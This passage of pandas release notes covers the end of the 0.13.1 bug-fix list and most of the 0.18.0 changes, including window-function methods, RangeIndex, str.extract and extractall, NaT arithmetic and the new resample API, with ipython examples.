Series with a MultiIndex via ix (:issue:`6018`)\n- Bug in Series.xs with a MultiIndex (:issue:`6018`)\n- Bug in Series construction of mixed type with datelike and an integer (which should result in\n  object type and not automatic conversion) (:issue:`6028`)\n- Possible segfault when chained indexing with an object array under NumPy 1.7.1 (:issue:`6026`, :issue:`6056`)\n- Bug in setting using fancy indexing a single element with a non-scalar (e.g. a list),\n  (:issue:`6043`)\n- ``to_sql`` did not respect ``if_exists`` (:issue:`4110` :issue:`4304`)\n- Regression in ``.get(None)`` indexing from 0.12 (:issue:`5652`)\n- Subtle ``iloc`` indexing bug, surfaced in (:issue:`6059`)\n- Bug with insert of strings into DatetimeIndex (:issue:`5818`)\n- Fixed unicode bug in to_html/HTML repr (:issue:`6098`)\n- Fixed missing arg validation in get_options_data (:issue:`6105`)\n- Bug in assignment with duplicate columns in a frame where the locations\n  are a slice (e.g. next to each other) (:issue:`6120`)\n- Bug in propagating _ref_locs during construction of a DataFrame with dups\n  index/columns (:issue:`6121`)\n- Bug in ``DataFrame.apply`` when using mixed datelike reductions (:issue:`6125`)\n- Bug in ``DataFrame.append`` when appending a row with different columns (:issue:`6129`)\n- Bug in DataFrame construction with recarray and non-ns datetime dtype (:issue:`6140`)\n- Bug in ``.loc`` setitem indexing with a dataframe on rhs, multiple item setting, and\n  a datetimelike (:issue:`6152`)\n- Fixed a bug in ``query``/``eval`` during lexicographic string comparisons (:issue:`6155`).\n- Fixed a bug in ``query`` where the index of a single-element ``Series`` was\n  being thrown away (:issue:`6148`).\n- Bug in ``HDFStore`` on appending a dataframe with MultiIndexed columns to\n  an existing table (:issue:`6167`)\n- Consistency with dtypes in setting an empty DataFrame (:issue:`6171`)\n- Bug in selecting on a MultiIndex ``HDFStore`` even in the presence of under\n  specified column spec (:issue:`6169`)\n- Bug in ``nanops.var`` with ``ddof=1`` and 1 elements would sometimes return ``inf``\n  rather than ``nan`` on some platforms (:issue:`6136`)\n- Bug in Series and DataFrame bar plots ignoring the ``use_index`` keyword (:issue:`6209`)\n- Bug in groupby with mixed str/int under python3 fixed; ``argsort`` was failing (:issue:`6212`)\n\n.. _whatsnew_0.13.1.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.13.0..v0.13.1\n\n\n.. _whatsnew_0180:\n\nVersion 0.18.0 (March 13, 2016)\n-------------------------------\n\n{{ header }}\n\n\nThis is a major release from 0.17.1 and includes a small number of API changes, several new features,\nenhancements, and performance improvements along with a large number of bug fixes. We recommend that all\nusers upgrade to this version.\n\n.. warning::\n\n   pandas >= 0.18.0 no longer supports compatibility with Python version 2.6\n   and 3.3 (:issue:`7718`, :issue:`11273`)\n\n.. warning::\n\n   ``numexpr`` version 2.4.4 will now show a warning and not be used as a computation back-end for pandas because of some buggy behavior. This does not affect other versions (>= 2.1 and >= 2.4.6). (:issue:`12489`)\n\nHighlights include:\n\n- Moving and expanding window functions are now methods on Series and DataFrame,\n  similar to ``.groupby``, see :ref:`here <whatsnew_0180.enhancements.moments>`.\n- Adding support for a ``RangeIndex`` as a specialized form of the ``Int64Index``\n  for memory savings, see :ref:`here <whatsnew_0180.enhancements.rangeindex>`.\n- API breaking change to the ``.resample`` method to make it more ``.groupby``\n  like, see :ref:`here <whatsnew_0180.breaking.resample>`.\n- Removal of support for positional indexing with floats, which was deprecated\n  since 0.14.0. This will now raise a ``TypeError``, see :ref:`here <whatsnew_0180.float_indexers>`.\n- The ``.to_xarray()`` function has been added for compatibility with the\n  `xarray package <http://xarray.pydata.org/en/stable/>`__, see :ref:`here <whatsnew_0180.enhancements.xarray>`.\n- The ``read_sas`` function has been enhanced to read ``sas7bdat`` files, see :ref:`here <whatsnew_0180.enhancements.sas>`.\n- Addition of the :ref:`.str.extractall() method <whatsnew_0180.enhancements.extract>`,\n  and API changes to the :ref:`.str.extract() method <whatsnew_0180.enhancements.extract>`\n  and :ref:`.str.cat() method <whatsnew_0180.enhancements.strcat>`.\n- ``pd.test()`` top-level nose test runner is available (:issue:`4327`).\n\nCheck the :ref:`API Changes <whatsnew_0180.api_breaking>` and :ref:`deprecations <whatsnew_0180.deprecations>` before updating.\n\n.. contents:: What's new in v0.18.0\n    :local:\n    :backlinks: none\n\n.. _whatsnew_0180.enhancements:\n\nNew features\n~~~~~~~~~~~~\n\n.. _whatsnew_0180.enhancements.moments:\n\nWindow functions are now methods\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWindow functions have been refactored to be methods on ``Series/DataFrame`` objects, rather than top-level functions, which are now deprecated. This allows these window-type functions, to have a similar API to that of ``.groupby``. See the full documentation :ref:`here <window.overview>` (:issue:`11603`, :issue:`12373`)\n\n\n.. ipython:: python\n\n   np.random.seed(1234)\n   df = pd.DataFrame({'A': range(10), 'B': np.random.randn(10)})\n   df\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [8]: pd.rolling_mean(df, window=3)\n           FutureWarning: pd.rolling_mean is deprecated for DataFrame and will be removed in a future version, replace with\n                          DataFrame.rolling(window=3,center=False).mean()\n   Out[8]:\n       A         B\n   0 NaN       NaN\n   1 NaN       NaN\n   2   1  0.237722\n   3   2 -0.023640\n   4   3  0.133155\n   5   4 -0.048693\n   6   5  0.342054\n   7   6  0.370076\n   8   7  0.079587\n   9   8 -0.954504\n\nNew behavior:\n\n.. ipython:: python\n\n   r = df.rolling(window=3)\n\nThese show a descriptive repr\n\n.. ipython:: python\n\n   r\nwith tab-completion of available methods and properties.\n\n.. code-block:: ipython\n\n   In [9]: r.<TAB>   noqa E225, E999\n   r.A           r.agg         r.apply       r.count       r.exclusions  r.max         r.median      r.name        r.skew        r.sum\n   r.B           r.aggregate   r.corr        r.cov         r.kurt        r.mean        r.min         r.quantile    r.std         r.var\n\nThe methods operate on the ``Rolling`` object itself\n\n.. ipython:: python\n\n   r.mean()\n\nThey provide getitem accessors\n\n.. ipython:: python\n\n   r['A'].mean()\n\nAnd multiple aggregations\n\n.. ipython:: python\n\n   r.agg({'A': ['mean', 'std'],\n          'B': ['mean', 'std']})\n\n.. _whatsnew_0180.enhancements.rename:\n\nChanges to rename\n^^^^^^^^^^^^^^^^^\n\n``Series.rename`` and ``NDFrame.rename_axis`` can now take a scalar or list-like\nargument for altering the Series or axis *name*, in addition to their old behaviors of altering labels. (:issue:`9494`, :issue:`11965`)\n\n.. ipython:: python\n\n   s = pd.Series(np.random.randn(5))\n   s.rename('newname')\n\n.. ipython:: python\n\n   df = pd.DataFrame(np.random.randn(5, 2))\n   (df.rename_axis(\"indexname\")\n      .rename_axis(\"columns_name\", axis=\"columns\"))\n\nThe new functionality works well in method chains. Previously these methods only accepted functions or dicts mapping a *label* to a new label.\nThis continues to work as before for function or dict-like values.\n\n\n.. _whatsnew_0180.enhancements.rangeindex:\n\nRange Index\n^^^^^^^^^^^\n\nA ``RangeIndex`` has been added to the ``Int64Index`` sub-classes to support a memory saving alternative for common use cases. This has a similar implementation to the python ``range`` object (``xrange`` in python 2), in that it only stores the start, stop, and step values for the index. It will transparently interact with the user API, converting to ``Int64Index`` if needed.\n\nThis will now be the default constructed index for ``NDFrame`` objects, rather than previous an ``Int64Index``. (:issue:`939`, :issue:`12070`, :issue:`12071`, :issue:`12109`, :issue:`12888`)\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [3]: s = pd.Series(range(1000))\n\n   In [4]: s.index\n   Out[4]:\n   Int64Index([  0,   1,   2,   3,   4,   5,   6,   7,   8,   9,\n               ...\n               990, 991, 992, 993, 994, 995, 996, 997, 998, 999], dtype='int64', length=1000)\n\n   In [6]: s.index.nbytes\n   Out[6]: 8000\n\n\nNew behavior:\n\n.. ipython:: python\n\n   s = pd.Series(range(1000))\n   s.index\n   s.index.nbytes\n\n.. _whatsnew_0180.enhancements.extract:\n\nChanges to str.extract\n^^^^^^^^^^^^^^^^^^^^^^\n\nThe :ref:`.str.extract <text.extract>` method takes a regular\nexpression with capture groups, finds the first match in each subject\nstring, and returns the contents of the capture groups\n(:issue:`11386`).\n\nIn v0.18.0, the ``expand`` argument was added to\n``extract``.\n\n- ``expand=False``: it returns a ``Series``, ``Index``, or ``DataFrame``, depending on the subject and regular expression pattern (same behavior as pre-0.18.0).\n- ``expand=True``: it always returns a ``DataFrame``, which is more consistent and less confusing from the perspective of a user.\n\nCurrently the default is ``expand=None`` which gives a ``FutureWarning`` and uses ``expand=False``. To avoid this warning, please explicitly specify ``expand``.\n\n.. code-block:: ipython\n\n   In [1]: pd.Series(['a1', 'b2', 'c3']).str.extract(r'[ab](\\d)', expand=None)\n   FutureWarning: currently extract(expand=None) means expand=False (return Index/Series/DataFrame)\n   but in a future version of pandas this will be changed to expand=True (return DataFrame)\n\n   Out[1]:\n   0      1\n   1      2\n   2    NaN\n   dtype: object\n\nExtracting a regular expression with one group returns a Series if\n``expand=False``.\n\n.. ipython:: python\n\n   pd.Series(['a1', 'b2', 'c3']).str.extract(r'[ab](\\d)', expand=False)\n\nIt returns a ``DataFrame`` with one column if ``expand=True``.\n\n.. ipython:: python\n\n   pd.Series(['a1', 'b2', 'c3']).str.extract(r'[ab](\\d)', expand=True)\n\nCalling on an ``Index`` with a regex with exactly one capture group\nreturns an ``Index`` if ``expand=False``.\n\n.. ipython:: python\n\n   s = pd.Series([\"a1\", \"b2\", \"c3\"], [\"A11\", \"B22\", \"C33\"])\n   s.index\n   s.index.str.extract(\"(?P<letter>[a-zA-Z])\", expand=False)\n\nIt returns a ``DataFrame`` with one column if ``expand=True``.\n\n.. ipython:: python\n\n   s.index.str.extract(\"(?P<letter>[a-zA-Z])\", expand=True)\n\nCalling on an ``Index`` with a regex with more than one capture group\nraises ``ValueError`` if ``expand=False``.\n\n.. code-block:: python\n\n    >>> s.index.str.extract(\"(?P<letter>[a-zA-Z])([0-9]+)\", expand=False)\n    ValueError: only one regex group is supported with Index\n\nIt returns a ``DataFrame`` if ``expand=True``.\n\n.. ipython:: python\n\n   s.index.str.extract(\"(?P<letter>[a-zA-Z])([0-9]+)\", expand=True)\n\nIn summary, ``extract(expand=True)`` always returns a ``DataFrame``\nwith a row for every subject string, and a column for every capture\ngroup.\n\n.. _whatsnew_0180.enhancements.extractall:\n\nAddition of str.extractall\n^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe :ref:`.str.extractall <text.extractall>` method was added\n(:issue:`11386`).  Unlike ``extract``, which returns only the first\nmatch.\n\n.. ipython:: python\n\n   s = pd.Series([\"a1a2\", \"b1\", \"c1\"], [\"A\", \"B\", \"C\"])\n   s\n   s.str.extract(r\"(?P<letter>[ab])(?P<digit>\\d)\", expand=False)\n\nThe ``extractall`` method returns all matches.\n\n.. ipython:: python\n\n   s.str.extractall(r\"(?P<letter>[ab])(?P<digit>\\d)\")\n\n.. _whatsnew_0180.enhancements.strcat:\n\nChanges to str.cat\n^^^^^^^^^^^^^^^^^^\n\nThe method ``.str.cat()`` concatenates the members of a ``Series``. Before, if ``NaN`` values were present in the Series, calling ``.str.cat()`` on it would return ``NaN``, unlike the rest of the ``Series.str.*`` API. This behavior has been amended to ignore ``NaN`` values by default. (:issue:`11435`).\n\nA new, friendlier ``ValueError`` is added to protect against the mistake of supplying the ``sep`` as an arg, rather than as a kwarg. (:issue:`11334`).\n\n.. ipython:: python\n\n    pd.Series(['a', 'b', np.nan, 'c']).str.cat(sep=' ')\n    pd.Series(['a', 'b', np.nan, 'c']).str.cat(sep=' ', na_rep='?')\n\n.. code-block:: ipython\n\n    In [2]: pd.Series(['a', 'b', np.nan, 'c']).str.cat(' ')\n    ValueError: Did you mean to supply a ``sep`` keyword?\n\n\n.. _whatsnew_0180.enhancements.rounding:\n\nDatetimelike rounding\n^^^^^^^^^^^^^^^^^^^^^\n\n``DatetimeIndex``, ``Timestamp``, ``TimedeltaIndex``, ``Timedelta`` have gained the ``.round()``, ``.floor()`` and ``.ceil()`` method for datetimelike rounding, flooring and ceiling. (:issue:`4314`, :issue:`11963`)\n\nNaive datetimes\n\n.. ipython:: python\n\n   dr = pd.date_range('20130101 09:12:56.1234', periods=3)\n   dr\n   dr.round('s')\n\n    Timestamp scalar\n   dr[0]\n   dr[0].round('10s')\n\nTz-aware are rounded, floored and ceiled in local times\n\n.. ipython:: python\n\n   dr = dr.tz_localize('US/Eastern')\n   dr\n   dr.round('s')\n\nTimedeltas\n\n.. ipython:: python\n\n   t = pd.timedelta_range('1 days 2 hr 13 min 45 us', periods=3, freq='d')\n   t\n   t.round('10min')\n\n    Timedelta scalar\n   t[0]\n   t[0].round('2h')\n\n\nIn addition, ``.round()``, ``.floor()`` and ``.ceil()`` will be available through the ``.dt`` accessor of ``Series``.\n\n.. ipython:: python\n\n   s = pd.Series(dr)\n   s\n   s.dt.round('D')\n\nFormatting of integers in FloatIndex\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIntegers in ``FloatIndex``, e.g. 1., are now formatted with a decimal point and a ``0`` digit, e.g. ``1.0`` (:issue:`11713`)\nThis change not only affects the display to the console, but also the output of IO methods like ``.to_csv`` or ``.to_html``.\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [2]: s = pd.Series([1, 2, 3], index=np.arange(3.))\n\n   In [3]: s\n   Out[3]:\n   0    1\n   1    2\n   2    3\n   dtype: int64\n\n   In [4]: s.index\n   Out[4]: Float64Index([0.0, 1.0, 2.0], dtype='float64')\n\n   In [5]: print(s.to_csv(path=None))\n   0,1\n   1,2\n   2,3\n\n\nNew behavior:\n\n.. ipython:: python\n\n   s = pd.Series([1, 2, 3], index=np.arange(3.))\n   s\n   s.index\n   print(s.to_csv(path_or_buf=None, header=False))\n\nChanges to dtype assignment behaviors\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWhen a DataFrame's slice is updated with a new slice of the same dtype, the dtype of the DataFrame will now remain the same. (:issue:`10503`)\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [5]: df = pd.DataFrame({'a': [0, 1, 1],\n                              'b': pd.Series([100, 200, 300], dtype='uint32')})\n\n   In [7]: df.dtypes\n   Out[7]:\n   a     int64\n   b    uint32\n   dtype: object\n\n   In [8]: ix = df['a'] == 1\n\n   In [9]: df.loc[ix, 'b'] = df.loc[ix, 'b']\n\n   In [11]: df.dtypes\n   Out[11]:\n   a    int64\n   b    int64\n   dtype: object\n\nNew behavior:\n\n.. ipython:: python\n\n   df = pd.DataFrame({'a': [0, 1, 1],\n                      'b': pd.Series([100, 200, 300], dtype='uint32')})\n   df.dtypes\n   ix = df['a'] == 1\n   df.loc[ix, 'b'] = df.loc[ix, 'b']\n   df.dtypes\n\nWhen a DataFrame's integer slice is partially updated with a new slice of floats that could potentially be down-casted to integer without losing precision, the dtype of the slice will be set to float instead of integer.\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [4]: df = pd.DataFrame(np.array(range(1,10)).reshape(3,3),\n                             columns=list('abc'),\n                             index=[[4,4,8], [8,10,12]])\n\n   In [5]: df\n   Out[5]:\n         a  b  c\n   4 8   1  2  3\n     10  4  5  6\n   8 12  7  8  9\n\n   In [7]: df.ix[4, 'c'] = np.array([0., 1.])\n\n   In [8]: df\n   Out[8]:\n         a  b  c\n   4 8   1  2  0\n     10  4  5  1\n   8 12  7  8  9\n\nNew behavior:\n\n.. ipython:: python\n\n   df = pd.DataFrame(np.array(range(1,10)).reshape(3,3),\n                     columns=list('abc'),\n                     index=[[4,4,8], [8,10,12]])\n   df\n   df.loc[4, 'c'] = np.array([0., 1.])\n   df\n\n.. _whatsnew_0180.enhancements.xarray:\n\nMethod to_xarray\n^^^^^^^^^^^^^^^^\n\nIn a future version of pandas, we will be deprecating ``Panel`` and other > 2 ndim objects. In order to provide for continuity,\nall ``NDFrame`` objects have gained the ``.to_xarray()`` method in order to convert to ``xarray`` objects, which has\na pandas-like interface for > 2 ndim. (:issue:`11972`)\n\nSee the `xarray full-documentation here <http://xarray.pydata.org/en/stable/>`__.\n\n.. code-block:: ipython\n\n   In [1]: p = Panel(np.arange(2*3*4).reshape(2,3,4))\n\n   In [2]: p.to_xarray()\n   Out[2]:\n   <xarray.DataArray (items: 2, major_axis: 3, minor_axis: 4)>\n   array([[[ 0,  1,  2,  3],\n           [ 4,  5,  6,  7],\n           [ 8,  9, 10, 11]],\n\n          [[12, 13, 14, 15],\n           [16, 17, 18, 19],\n           [20, 21, 22, 23]]])\n   Coordinates:\n     * items       (items) int64 0 1\n     * major_axis  (major_axis) int64 0 1 2\n     * minor_axis  (minor_axis) int64 0 1 2 3\n\nLatex representation\n^^^^^^^^^^^^^^^^^^^^\n\n``DataFrame`` has gained a ``._repr_latex_()`` method in order to allow for conversion to latex in a ipython/jupyter notebook using nbconvert. (:issue:`11778`)\n\nNote that this must be activated by setting the option ``pd.display.latex.repr=True`` (:issue:`12182`)\n\nFor example, if you have a jupyter notebook you plan to convert to latex using nbconvert, place the statement ``pd.display.latex.repr=True`` in the first cell to have the contained DataFrame output also stored as latex.\n\nThe options ``display.latex.escape`` and ``display.latex.longtable`` have also been added to the configuration and are used automatically by the ``to_latex``\nmethod. See the :ref:`available options docs <options.available>` for more info.\n\n.. _whatsnew_0180.enhancements.sas:\n\n``pd.read_sas()`` changes\n^^^^^^^^^^^^^^^^^^^^^^^^^\n\n``read_sas`` has gained the ability to read SAS7BDAT files, including compressed files.  The files can be read in entirety, or incrementally.  For full details see :ref:`here <io.sas>`. (:issue:`4052`)\n\n.. _whatsnew_0180.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n\n- Handle truncated floats in SAS xport files (:issue:`11713`)\n- Added option to hide index in ``Series.to_string`` (:issue:`11729`)\n- ``read_excel`` now supports s3 urls of the format ``s3://bucketname/filename`` (:issue:`11447`)\n- add support for ``AWS_S3_HOST`` env variable when reading from s3 (:issue:`12198`)\n- A simple version of ``Panel.round()`` is now implemented (:issue:`11763`)\n- For Python 3.x, ``round(DataFrame)``, ``round(Series)``, ``round(Panel)`` will work (:issue:`11763`)\n- ``sys.getsizeof(obj)`` returns the memory usage of a pandas object, including the\n  values it contains (:issue:`11597`)\n- ``Series`` gained an ``is_unique`` attribute (:issue:`11946`)\n- ``DataFrame.quantile`` and ``Series.quantile`` now accept ``interpolation`` keyword (:issue:`10174`).\n- Added ``DataFrame.style.format`` for more flexible formatting of cell values (:issue:`11692`)\n- ``DataFrame.select_dtypes`` now allows the ``np.float16`` type code (:issue:`11990`)\n- ``pivot_table()`` now accepts most iterables for the ``values`` parameter (:issue:`12017`)\n- Added Google ``BigQuery`` service account authentication support, which enables authentication on remote servers. (:issue:`11881`, :issue:`12572`). For further details see `here <https://pandas-gbq.readthedocs.io/en/latest/intro.html>`__\n- ``HDFStore`` is now iterable: ``for k in store`` is equivalent to ``for k in store.keys()`` (:issue:`12221`).\n- Add missing methods/fields to ``.dt`` for ``Period`` (:issue:`8848`)\n- The entire code base has been ``PEP``-ified (:issue:`12096`)\n\n.. _whatsnew_0180.api_breaking:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n- the leading white spaces have been removed from the output of ``.to_string(index=False)`` method (:issue:`11833`)\n- the ``out`` parameter has been removed from the ``Series.round()`` method. (:issue:`11763`)\n- ``DataFrame.round()`` leaves non-numeric columns unchanged in its return, rather than raises. (:issue:`11885`)\n- ``DataFrame.head(0)`` and ``DataFrame.tail(0)`` return empty frames, rather than ``self``.  (:issue:`11937`)\n- ``Series.head(0)`` and ``Series.tail(0)`` return empty series, rather than ``self``.  (:issue:`11937`)\n- ``to_msgpack`` and ``read_msgpack`` encoding now defaults to ``'utf-8'``. (:issue:`12170`)\n- the order of keyword arguments to text file parsing functions (``.read_csv()``, ``.read_table()``, ``.read_fwf()``) changed to group related arguments. (:issue:`11555`)\n- ``NaTType.isoformat`` now returns the string ``'NaT`` to allow the result to\n  be passed to the constructor of ``Timestamp``. (:issue:`12300`)\n\nNaT and Timedelta operations\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n``NaT`` and ``Timedelta`` have expanded arithmetic operations, which are extended to ``Series``\narithmetic where applicable.  Operations defined for ``datetime64[ns]`` or ``timedelta64[ns]``\nare now also defined for ``NaT`` (:issue:`11564`).\n\n``NaT`` now supports arithmetic operations with integers and floats.\n\n.. ipython:: python\n\n   pd.NaT * 1\n   pd.NaT * 1.5\n   pd.NaT / 2\n   pd.NaT * np.nan\n\n``NaT`` defines more arithmetic operations with ``datetime64[ns]`` and ``timedelta64[ns]``.\n\n.. ipython:: python\n\n   pd.NaT / pd.NaT\n   pd.Timedelta('1s') / pd.NaT\n\n``NaT`` may represent either a ``datetime64[ns]`` null or a ``timedelta64[ns]`` null.\nGiven the ambiguity, it is treated as a ``timedelta64[ns]``, which allows more operations\nto succeed.\n\n.. ipython:: python\n\n   pd.NaT + pd.NaT\n\n    same as\n   pd.Timedelta('1s') + pd.Timedelta('1s')\n\nas opposed to\n\n.. code-block:: ipython\n\n   In [3]: pd.Timestamp('19900315') + pd.Timestamp('19900315')\n   TypeError: unsupported operand type(s) for +: 'Timestamp' and 'Timestamp'\n\nHowever, when wrapped in a ``Series`` whose ``dtype`` is ``datetime64[ns]`` or ``timedelta64[ns]``,\nthe ``dtype`` information is respected.\n\n.. code-block:: ipython\n\n   In [1]: pd.Series([pd.NaT], dtype='<M8[ns]') + pd.Series([pd.NaT], dtype='<M8[ns]')\n   TypeError: can only operate on a datetimes for subtraction,\n              but the operator [__add__] was passed\n\n.. ipython:: python\n\n   pd.Series([pd.NaT], dtype='<m8[ns]') + pd.Series([pd.NaT], dtype='<m8[ns]')\n\n``Timedelta`` division by ``floats`` now works.\n\n.. ipython:: python\n\n   pd.Timedelta('1s') / 2.0\n\nSubtraction by ``Timedelta`` in a ``Series`` by a ``Timestamp`` works (:issue:`11925`)\n\n.. ipython:: python\n\n   ser = pd.Series(pd.timedelta_range('1 day', periods=3))\n   ser\n   pd.Timestamp('2012-01-01') - ser\n\n\n``NaT.isoformat()`` now returns ``'NaT'``. This change allows\n``pd.Timestamp`` to rehydrate any timestamp like object from its isoformat\n(:issue:`12300`).\n\nChanges to msgpack\n^^^^^^^^^^^^^^^^^^\n\nForward incompatible changes in ``msgpack`` writing format were made over 0.17.0 and 0.18.0; older versions of pandas cannot read files packed by newer versions (:issue:`12129`, :issue:`10527`)\n\nBugs in ``to_msgpack`` and ``read_msgpack`` introduced in 0.17.0 and fixed in 0.18.0, caused files packed in Python 2 unreadable by Python 3 (:issue:`12142`). The following table describes the backward and forward compat of msgpacks.\n\n.. warning::\n\n   +----------------------+------------------------+\n   | Packed with          | Can be unpacked with   |\n   +======================+========================+\n   | pre-0.17 / Python 2  | any                    |\n   +----------------------+------------------------+\n   | pre-0.17 / Python 3  | any                    |\n   +----------------------+------------------------+\n   | 0.17 / Python 2      | - ==0.17 / Python 2    |\n   |                      | - >=0.18 / any Python  |\n   +----------------------+------------------------+\n   | 0.17 / Python 3      | >=0.18 / any Python    |\n   +----------------------+------------------------+\n   | 0.18                 | >= 0.18                |\n   +----------------------+------------------------+\n\n\n   0.18.0 is backward-compatible for reading files packed by older versions, except for files packed with 0.17 in Python 2, in which case only they can only be unpacked in Python 2.\n\nSignature change for .rank\n^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n``Series.rank`` and ``DataFrame.rank`` now have the same signature (:issue:`11759`)\n\nPrevious signature\n\n.. code-block:: ipython\n\n   In [3]: pd.Series([0,1]).rank(method='average', na_option='keep',\n                                 ascending=True, pct=False)\n   Out[3]:\n   0    1\n   1    2\n   dtype: float64\n\n   In [4]: pd.DataFrame([0,1]).rank(axis=0, numeric_only=None,\n                                    method='average', na_option='keep',\n                                    ascending=True, pct=False)\n   Out[4]:\n      0\n   0  1\n   1  2\n\nNew signature\n\n.. ipython:: python\n\n   pd.Series([0,1]).rank(axis=0, method='average', numeric_only=False,\n                         na_option='keep', ascending=True, pct=False)\n   pd.DataFrame([0,1]).rank(axis=0, method='average', numeric_only=False,\n                            na_option='keep', ascending=True, pct=False)\n\n\nBug in QuarterBegin with n=0\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn previous versions, the behavior of the QuarterBegin offset was inconsistent\ndepending on the date when the ``n`` parameter was 0. (:issue:`11406`)\n\nThe general semantics of anchored offsets for ``n=0`` is to not move the date\nwhen it is an anchor point (e.g., a quarter start date), and otherwise roll\nforward to the next anchor point.\n\n.. ipython:: python\n\n   d = pd.Timestamp('2014-02-01')\n   d\n   d + pd.offsets.QuarterBegin(n=0, startingMonth=2)\n   d + pd.offsets.QuarterBegin(n=0, startingMonth=1)\n\nFor the ``QuarterBegin`` offset in previous versions, the date would be rolled\n*backwards* if date was in the same month as the quarter start date.\n\n.. code-block:: ipython\n\n   In [3]: d = pd.Timestamp('2014-02-15')\n\n   In [4]: d + pd.offsets.QuarterBegin(n=0, startingMonth=2)\n   Out[4]: Timestamp('2014-02-01 00:00:00')\n\nThis behavior has been corrected in version 0.18.0, which is consistent with\nother anchored offsets like ``MonthBegin`` and ``YearBegin``.\n\n.. ipython:: python\n\n   d = pd.Timestamp('2014-02-15')\n   d + pd.offsets.QuarterBegin(n=0, startingMonth=2)\n\n.. _whatsnew_0180.breaking.resample:\n\nResample API\n^^^^^^^^^^^^\n\nLike the change in the window functions API :ref:`above <whatsnew_0180.enhancements.moments>`, ``.resample(...)`` is changing to have a more groupby-like API. (:issue:`11732`, :issue:`12702`, :issue:`12202`, :issue:`12332`, :issue:`12334`, :issue:`12348`, :issue:`12448`).\n\n.. ipython:: python\n\n   np.random.seed(1234)\n   df = pd.DataFrame(np.random.rand(10,4),\n                     columns=list('ABCD'),\n                     index=pd.date_range('2010-01-01 09:00:00',\n                                         periods=10, freq='s'))\n   df\n\n\n**Previous API**:\n\nYou would write a resampling operation that immediately evaluates. If a ``how`` parameter was not provided, it\nwould default to ``how='mean'``.\n\n.. code-block:: ipython\n\n   In [6]: df.resample('2s')\n   Out[6]:\n                            A         B         C         D\n   2010-01-01 09:00:00  0.485748  0.447351  0.357096  0.793615\n   2010-01-01 09:00:02  0.820801  0.794317  0.364034  0.531096\n   2010-01-01 09:00:04  0.433985  0.314582  0.424104  0.625733\n   2010-01-01 09:00:06  0.624988  0.609738  0.633165  0.612452\n   2010-01-01 09:00:08  0.510470  0.534317  0.573201  0.806949\n\nYou could also specify a ``how`` directly\n\n.. code-block:: ipython\n\n   In [7]: df.resample('2s', how='sum')\n   Out[7]:\n                            A         B         C         D\n   2010-01-01 09:00:00  0.971495  0.894701  0.714192  1.587231\n   2010-01-01 09:00:02  1.641602  1.588635  0.728068  1.062191\n   2010-01-01 09:00:04  0.867969  0.629165  0.848208  1.251465\n   2010-01-01 09:00:06  1.249976  1.219477  1.266330  1.224904\n   2010-01-01 09:00:08  1.020940  1.068634  1.146402  1.613897\n\n**New API**:\n\nNow, you can write ``.resample(..)`` as a 2-stage operation like ``.groupby(...)``, which\nyields a ``Resampler``.\n\n.. ipython:: python\n   :okwarning:\n\n   r = df.resample('2s')\n   r\n\nDownsampling\n\"\"\"\"\"\"\"\"\"\"\"\"\n\nYou can then use this object to perform operations.\nThese are downsampling operations (going from a higher frequency to a lower one).\n\n.. ipython:: python\n\n   r.mean()\n\n.. ipython:: python\n\n   r.sum()\n\nFurthermore, resample now supports ``getitem`` operations to perform the resample on specific columns.\n\n.. ipython:: python\n\n   r[['A','C']].mean()\n\nand ``.aggregate`` type operations.\n\n.. ipython:: python\n\n   r.agg({'A' : 'mean', 'B' : 'sum'})\n\nThese accessors can of course, be combined\n\n.. ipython:: python\n\n   r[['A','B']].agg(['mean','sum'])\n\nUpsampling\n\"\"\"\"\"\"\"\"\"\"\n\n.. currentmodule:: pandas.tseries.resample\n\nUpsampling operations take you from a lower frequency to a higher frequency. These are now\nperformed with the ``Resampler`` objects with :meth:`~Resampler.backfill`,\n:meth:`~Resampler.ffill`, :meth:`~Resampler.fillna` and :meth:`~Resampler.asfreq` methods.\n\n.. code-block:: ipython\n\n   In [89]: s = pd.Series(np.arange(5, dtype='int64'),\n                 index=pd.date_range('2010-01-01', periods=5, freq='Q'))\n\n   In [90]: s\n   Out[90]:\n   2010-03-31    0\n   2010-06-30    1\n   2010-09-30    2\n   2010-12-31    3\n   2011-03-31    4\n   Freq: Q-DEC, Length: 5, dtype: int64\n\nPreviously\n\n.. code-block:: ipython\n\n   In [6]: s.resample('M', fill_method='ffill')\n   Out[6]:\n   2010-03-31    0\n   2010-04-30    0\n   2010-05-31    0\n   2010-06-30    1\n   2010-07-31    1\n   2010-08-31    1\n   2010-09-30    2\n   2010-10-31    2\n   2010-11-30    2\n   2010-12-31    3\n   2011-01-31    3\n   2011-02-28    3\n   2011-03-31    4\n   Freq: M, dtype: int64\n\nNew API\n\n.. code-block:: ipython\n\n   In [91]: s.resample('M').ffill()\n   Out[91]:\n   2010-03-31    0\n   2010-04-30    0\n   2010-05-31    0\n   2010-06-30    1\n   2010-07-31    1\n   2010-08-31    1\n   2010-09-30    2\n   2010-10-31    2\n   2010-11-30    2\n   2010-12-31    3\n   2011-01-31    3\n   2011-02-28    3\n   2011-03-31    4\n   Freq: M, Length: 13, dtype: int64\n\n.. note::\n\n   In the new API, you can either downsample OR upsample. The prior implementation would allow you to pass an aggregator function (like ``mean``) even though you were upsampling, providing a bit of confusion.\n\nPrevious API will work but with deprecations\n\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n\n.. warning::\n\n   This new API for resample includes some internal changes for the prior-to-0.18.0 API, to work with a deprecation warning in most cases, as the resample operation returns a deferred object. We can intercept operations and just do what the (pre 0.18.0) API did (with a warning). 